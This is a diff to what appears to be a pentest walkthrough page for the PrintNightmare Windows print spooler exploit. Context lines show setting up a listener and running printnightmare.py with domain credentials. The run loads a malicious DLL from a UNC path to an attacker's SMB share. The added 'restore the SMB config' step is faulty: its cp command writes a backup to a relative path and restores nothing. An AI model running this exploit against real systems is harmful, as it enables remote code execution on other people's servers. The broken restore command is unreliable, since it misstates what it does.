@@ -181,6 +181,15 @@ Restart the smbd service
 sudo service smbd restart
 ```
 
+{{% notice warning %}}
+Don't forget to restore the SMB config :)
+{{% /notice %}}
+
+```bash
+sudo cp /etc/samba/smb.conf etc/samba/smb.conf.bak
+sudo service smbd restart
+```
+
 #### Run the Exploit
 
 Setup a listner
@@ -209,7 +218,7 @@ python3 printnightmare.py 'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\s
 ```
 
 {{% notice warning %}}
-Ensure that the first thing you do is restarting the spooler service. Spooler services sometimes crashes/hangs and from my experience you wont be able to run printnightmare a second time if you don't restart the spooler service.
+From my experience the Spooler services sometimes crashes/hangs and you wont be able to run printnightmare a second time if you don't restart the spooler service. If you don't spawn a new process in the DLL ensure that the first thing you do is restart the spooler service.
 {{% /notice %}}
 
 ```bash
